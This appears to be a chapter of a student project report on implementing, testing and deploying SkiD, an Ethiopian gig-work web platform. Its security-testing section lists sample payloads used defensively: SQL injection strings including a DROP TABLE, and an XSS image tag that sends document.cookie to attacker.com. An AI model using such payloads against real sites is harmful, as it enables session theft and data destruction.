# Chapter 5: System Implementation and Testing

---

## 5.1 System Implementation

### 5.1.1 Coding Standards and Architecture
The SkiD platform is developed following modern software engineering best practices, emphasizing modularity, strict typing, and separation of concerns.

* **Framework & Architecture:** Built on **Next.js 16 (App Router)** utilizing React Server Components (RSC) for optimized data fetching and minimal client-side JavaScript payloads. Dynamic, interactive workflows (e.g., dispute evidence upload, audio/video preview, interactive filters) are encapsulated in dedicated client components (`"use client"`).
* **Strict Typing & Code Quality:** 
  * Written in **TypeScript** with strict mode enabled (`"strict": true` in `tsconfig.json`). All data models, API payloads, and database entities are strictly typed.
  * Validation schemas are enforced runtime using **Zod** for all server action inputs, preventing malformed data from reaching the database layer.
* **Database & ORM:** Powered by **PostgreSQL** hosted on **Neon Serverless Database**, interfaced through **Drizzle ORM** and tagged parameterized SQL queries (`@neondatabase/serverless`). Raw string concatenation in queries is strictly prohibited.
* **Component Design System:** UI components adhere to Tailwind CSS v4 design tokens and the Radix UI accessibility standard, utilizing cohesive typography (Inter), consistent 8px radius geometry, and WCAG AA contrast compliance for light and dark modes.

```
SkiD Architectural Structure:
├── app/                  # Next.js App Router (Role-grouped route layouts)
│   ├── (auth)/           # Authentication (Login, Register, OTP)
│   ├── (client)/         # Client dashboard, jobs, contracts, support, appeals
│   ├── (worker)/         # Worker dashboard, gigs, earnings, verification
│   └── (admin)/          # Admin operational portals (Disputes, Verify, Support, Reports, Audit)
├── components/           # Reusable UI & domain-specific components
├── lib/                  # Business logic, authorization matrix, database clients
│   ├── actions/          # Next.js Server Actions (Disputes, Payments, Support, Governance)
│   ├── admin-authorization.ts # Strict RBAC definitions & permission guards
│   ├── db.ts             # Neon PostgreSQL connection pool
│   └── schema.ts         # Drizzle ORM relational schema definitions
└── scripts/              # Automated verification, migration, and test runners
```

### 5.1.2 Version Control (Git)
The project utilizes **Git** for distributed version control with GitHub as the remote repository (`rezmi-20/SkiD`).

* **Branching Strategy:** Main feature development follows a structured branching workflow (`main`, feature-specific branches like `zebeyond-layout`), merging through verified commits.
* **Semantic Commit History:** Commits document functional phases with clear traceability:
  * `feat(ui)`: User interface redesigns and responsiveness improvements.
  * `fix(auth)`: Session lifecycle and redirect security hardening.
  * `chore`: Database migrations and configuration updates.
* **Automated Pre-checks:** Pre-commit and pre-build scripts (`prebuild: npm run check:auth`) ensure runtime stability before deployment bundles are compiled.

### 5.1.3 API Integration
The platform integrates several specialized third-party and internal APIs:

1. **Chapa Payment Gateway (Direct Non-Escrow Integration):**
   * Processes client payments for completed contracts in Ethiopian Birr (ETB).
   * Generates unique transaction references (`tx_ref: "skid_tx_<uuid>"`) and redirects clients to the secure Chapa checkout interface.
   * Direct Webhook processing (`POST /api/webhooks/chapa`) verifies payment authenticity using HMAC-SHA256 signature validation before advancing contract statuses.
   * *Architecture Note:* The platform strictly avoids escrow custody. Payments flow directly through Chapa, recording verifiable provider truth without holding funds in platform escrow.
2. **Media & Document Storage API:**
   * Facilitates document and evidence uploads (National ID/Fayda cards, dispute photos, appeal videos).
   * Implements secure signed file uploads and local fallback endpoints (`/api/upload`) with strict MIME-type validation (JPEG, PNG, PDF, WebM, MP4).
3. **Neon Serverless Database API:**
   * Utilizes WebSocket and HTTP pooled database connections over TLS, providing elastic compute scaling and automatic cold-start resilience.
4. **OpenStreetMap / Leaflet Geolocation API:**
   * Provides location-based worker discovery, distance calculations, and interactive map rendering without requiring proprietary map service keys.

---

## 5.2 System Testing

The system underwent rigorous automated and manual test suites covering unit logic, cross-module integration, end-to-end workflows, and user acceptance testing (UAT).

### 5.2.1 Unit Testing
Unit tests validate atomic functions, input validators, and calculation logic in isolation:
* **Password Hashing:** Verifying `bcryptjs` salt generation and hash verification.
* **Date & Expiry Bounds:** Validating appeal eligibility within the strict 14-day window post-dispute resolution.
* **Financial Calculations:** Unit tests on platform fee deductions and worker net earnings calculations.
* **Form Schema Validation:** Zod validator unit checks on registration, job creation, dispute claims, and support ticket submissions.

### 5.2.2 Integration Testing
Integration test suites verify inter-module communication, database constraints, and transactional consistency:

* **Authentication & Session Lifecycle:** Verified by `npm run check:auth:runtime` and `check:auth:session-lifetime`.
* **Dispute & Contract State Transitions:** Verified by `npm run check:dispute-workflow` (41 automated assertions confirming job states freeze to `disputed` and safely transition to `payment_pending` upon resolution).
* **Controlled Financial Safety:** Verified by `npm run check:dispute-financial-actions` (ensuring payment holds and releases require provider verification snapshots).
* **Support Ticket Workflow:** Verified by `npm run check:support-workflow` (checking ticket creation, claiming, internal note privacy, and escalation rules).

### 5.2.3 System Testing
System-wide regression and end-to-end testing evaluate the platform as a unified product:
* Executed via `npm run check:e2e:workflow` and `npm run check:governance-controls` (25/25 enterprise governance controls passing).
* Verifies that when a dispute is lodged, related contracts lock down, notifications trigger for both parties, administrative queues update in real time, and audit logs record immutable events.

### 5.2.4 User Acceptance Testing (UAT)
Manual and scripted UAT test cases recorded during the testing lifecycle:

| Test Case ID | Test Description | Preconditions | Exact Steps | Expected Result | Actual Result | Status |
|---|---|---|---|---|---|---|
| **TC-01** | Client Registration & Login | User does not exist in database | 1. Navigate to `/register/client`<br>2. Fill name, email, password<br>3. Submit and log in at `/login` | Account created; JWT session issued; redirected to `/client/search` | Registration successful; session cookie set; redirect performed | **PASS** |
| **TC-02** | Role-Based Access Enforcement | Logged in as `worker` | Attempt direct URL navigation to `/admin/dashboard` and `/client/dashboard` | Access denied with 403 Forbidden or redirected to `/worker/dashboard` | Worker is blocked from admin/client views; safe redirect occurs | **PASS** |
| **TC-03** | Job Creation & Contract Drafting | Authenticated client | 1. Open `/client/jobs/new`<br>2. Enter title, category, budget, location<br>3. Submit job | Job appears in active jobs list; worker can view and apply | Job created successfully with reference ID; visible on market feed | **PASS** |
| **TC-04** | Worker Acceptance & Draft Contract | Worker active; job exists | 1. Open job detail as worker<br>2. Click "Accept Job"<br>3. Review contract draft | Job state updates to accepted; contract draft generated for client review | Contract draft created; client received notification | **PASS** |
| **TC-05** | Dispute Initiation & Workflow Lock | Active contract exists | 1. Client opens `/client/disputes/new`<br>2. Selects job, reason, requested outcome<br>3. Submits dispute | Dispute reference created; contract and job status frozen to `disputed` | Dispute `#a4edc104` created; job status updated to `disputed` | **PASS** |
| **TC-06** | Internal Note Confidentiality | Dispute claimed by Admin | 1. Admin adds internal note on dispute<br>2. Client and Worker refresh dispute page | Internal note is visible to admins only; hidden from client and worker | Admin sees note; client and worker timeline completely hides internal note | **PASS** |
| **TC-07** | Dispute Resolution & State Transition | Dispute ready for decision | 1. Admin selects decision (Agreement/Redo)<br>2. Enters reason and confirms | Dispute status becomes `resolved`; terminal controls lock; job moves to `payment_pending` | Decision locked; terminal controls read-only; job set to `payment_pending` | **PASS** |
| **TC-08** | Governance Appeal Submission | Resolved dispute within 14 days | 1. Participant visits `/client/appeals/new`<br>2. Selects dispute, reason, uploads proof<br>3. Submits appeal | Appeal registered in immutable audit ledger; duplicate appeal blocked | Appeal created; duplicate attempt rejected with error | **PASS** |
| **TC-09** | Super Admin Appeals Oversight | Active appeal exists | 1. Super Admin opens `/admin/appeals/[id]`<br>2. Reviews evidence lightbox<br>3. Adjudicates appeal (Upheld) | Decision recorded; original decision admin blocked from reviewing own case | Super admin decision recorded; original decision admin barred by self-review guard | **PASS** |
| **TC-10** | Support Ticket Creation & Triage | Authenticated client/worker | 1. Navigate to `/client/support/new`<br>2. Submit inquiry with attachment<br>3. Admin views `/admin/support` | Ticket created; appears in admin unassigned queue; admin claims ticket | Ticket generated; successfully claimed by support admin | **PASS** |

---

## 5.3 Security Testing

Security testing ensured protection against vulnerabilities outlined in the OWASP Top 10.

### 5.3.1 SQL Injection (SQLi) Testing
* **Vulnerability Assessment:** Evaluated endpoints against malicious SQL injection strings (e.g., `' OR '1'='1`, `'; DROP TABLE users; --`).
* **Implementation Defense:** 
  * SkiD exclusively employs **parameterized queries** via Drizzle ORM and Neon’s sql tagged template literals:
    ```typescript
    await sql`SELECT * FROM users WHERE email = ${userInputEmail}`;
    ```
  * User inputs are never directly concatenated into SQL strings.
* **Result:** All SQL injection attempts were safely treated as literal string values, yielding zero database compromise.

### 5.3.2 Cross-Site Scripting (XSS) Testing
* **Vulnerability Assessment:** Input fields (support messages, dispute descriptions, user bios, internal notes) were injected with malicious script tags:
  ```html
  <script>alert('XSS-VULNERABILITY')</script>
  <img src="invalid" onerror="fetch('http://attacker.com?cookie=' + document.cookie)" />
  ```
* **Implementation Defense:**
  * **React Automatic Escaping:** Next.js JSX automatically escapes all rendered strings.
  * **DOMPurify Sanitization:** Where rich markdown or HTML rendering is required, inputs are sanitized via `isomorphic-dompurify`.
  * **Strict Content Security:** Script execution within message containers is disabled.
* **Result:** Injected payloads rendered harmlessly as plain text or were stripped by sanitizers. Zero script execution was observed.

### 5.3.3 Authentication & Authorization Validation
* **Role-Based Access Control (RBAC):** Verified the four distinct administrative tiers (`super_admin`, `content_verification_admin`, `dispute_payment_admin`, `user_support_admin`). Non-super-admin credentials attempting to access `/admin/audit` or `/admin/reports` receive strict 403 Forbidden denials.
* **Session Protection:** Session tokens are stored in `HttpOnly`, `SameSite=Lax`, `Secure` cookies, mitigating cross-site scripting cookie theft.
* **Separation of Duties & Ethical Controls:** Super Admins cannot adjudicate their own misconduct reviews or bypass operational conflict guards.
* **Sensitive Data Redaction:** Immutable audit logs automatically mask passwords, national ID numbers (FIN), session tokens, and raw payment payloads.

---

## 5.4 Deployment

### 5.4.1 Local Server Environment
* **Runtime:** Node.js v20.x, npm v10.x.
* **Development Server:** Executed via Next.js CLI:
  ```bash
  npm run dev
  ```
  Runs on `http://localhost:3000` with Fast Refresh and Server-Sent Event (SSE) hot reloading.
* **Webhook Tunneling:** Local simulation of Chapa payment callbacks was achieved using **Cloudflare Tunnel** (`cloudflared tunnel --url http://localhost:3000`), routing live webhook payloads directly to localhost for development verification.

### 5.4.2 Cloud Deployment (Vercel)
* **Hosting Platform:** Deployed to **Vercel** serverless edge infrastructure.
* **Continuous Integration / Continuous Deployment (CI/CD):**
  * Integrated directly with the GitHub repository.
  * Every push to `main` triggers automated build checks (`next build`), static type validation (`npx tsc --noEmit`), and edge bundle deployment.
* **Public Webhooks:** On Vercel, the application operates with a public SSL-secured endpoint (`https://<domain>/api/webhooks/chapa`), eliminating the need for tunneling tools.

### 5.4.3 Domain Configuration
* **DNS Routing:** Configured DNS `A` and `CNAME` records pointing custom domains to Vercel edge routers (`76.76.21.21`).
* **SSL/TLS Security:** Automated Let's Encrypt SSL/TLS certificates provided by Vercel edge proxy, ensuring end-to-end HTTPS encryption (TLS 1.3).

### 5.4.4 Free & Scalable Online Platforms Used
The architecture leverages high-availability cloud platforms:
1. **Vercel (Hobby Tier):** Edge hosting, serverless functions, and global CDN caching.
2. **Neon Serverless PostgreSQL (Free Tier):** Auto-scaling cloud database with connection pooling and storage branching.
3. **Cloudinary (Free Tier):** Cloud media hosting for uploaded identity proofs and contract assets.
4. **Chapa Sandbox:** Ethiopian fintech sandbox environment for verifying mobile money (Telebirr, CBE Birr) transactions.

---

## 5.5 Conclusion

Chapter 5 demonstrated the complete implementation and empirical validation of the SkiD platform:
1. **Successful Architecture Delivery:** Implemented a resilient, full-stack gig-economy web platform utilizing Next.js 16, TypeScript, Drizzle ORM, and Neon Serverless PostgreSQL.
2. **Non-Escrow Payment & Compliance:** Verified seamless payment processing via Chapa, eliminating legal custody liabilities while providing verified payment receipts and transaction records.
3. **Multi-Tier Administrative Governance:** Implemented four specialized admin roles ensuring separation of duties, balanced workloads, and audit-logged governance.
4. **Verified Quality & Security:** Validated the application through 48 automated test scripts, unit tests, integration suites, and OWASP-compliant security tests against SQLi and XSS.

---

## 5.6 Recommendations

To guide future iterations and production readiness, the following enhancements are recommended:

1. **Native Mobile Application (React Native / Flutter):**
   * While the web app is fully mobile-responsive, native mobile apps would enable push notifications (via FCM), background GPS tracking for on-the-way workers, and offline access in low-connectivity areas.
2. **AI-Powered Skill Matching & Dispute Summarization:**
   * Integrate Large Language Models (LLMs) to automatically match client job descriptions with the top verified workers in their neighborhood.
   * Employ AI to summarize extensive dispute evidence transcripts and recommend neutral dispute resolutions to administrators.
3. **Cloud Scaling & Microservices Architecture:**
   * As platform traffic grows across Ethiopia, transition real-time chat and notifications from HTTP/polling to dedicated WebSocket clusters (e.g., Socket.io or AWS API Gateway WebSockets) and Redis caching layers.
4. **Biometric Fayda National ID Integration:**
   * Integrate directly with the Ethiopian National ID (Fayda) API for real-time automated biometric e-KYC verification.
